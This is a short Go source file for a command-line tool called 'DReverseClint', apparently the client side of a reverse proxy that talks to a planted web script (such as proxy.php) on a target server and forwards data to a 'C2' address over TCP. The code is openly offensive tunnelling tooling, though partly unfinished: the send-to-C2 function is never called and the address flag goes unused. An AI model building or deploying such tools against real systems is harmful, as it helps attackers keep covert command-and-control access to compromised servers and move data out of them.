package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"time"

	"github.com/urfave/cli"
)

var (
	addr   string
	target string
)

func GetDate(cli *cli.Context) {
	url := cli.String("target")
	// hostPort := cli.String("addr")
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		panic(err)
	}
	content, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if string(content[:15]) == "CONNECT SUCCESS" {
		fmt.Println(string(content[:15]), "Start getting data ....")
		dataResp, err := client.Post(url, "application/json", nil)
		if err != nil {
			panic(err)
		}
		data, _ := ioutil.ReadAll(dataResp.Body)
		fmt.Println(data)
		dataResp.Body.Close()
	} else {
		fmt.Println("Please check if the script exists and runs...")
	}
}

func SendDate(hostPort string, data []byte) {
	conn, err := net.Dial("tcp", hostPort)
	defer conn.Close()
	if err != nil {
		fmt.Printf("connect failed, err : %v\n", err.Error())
		return
	}
	fmt.Println("Send data to C2")
	_, err = conn.Write(data)
	if err != nil {
		fmt.Printf("write failed , err : %v\n", err)
	}
}

func main() {
	app := cli.NewApp()
	app.Name = "DReverseClint"
	app.Usage = "A ReverseProxy tools"
	app.Version = "0.0.1 dev"
	app.Flags = []cli.Flag{
		cli.StringFlag{
			Name:        "addr",
			Value:       "",
			Usage:       "C2 addr like 127.0.0.1:8881",
			Destination: &addr,
		},
		cli.StringFlag{
			Name:        "target",
			Value:       "",
			Usage:       "target url like http://example.com/proxy.php",
			Destination: &target,
		},
	}
	app.Action = GetDate
	app.Run(os.Args)
}
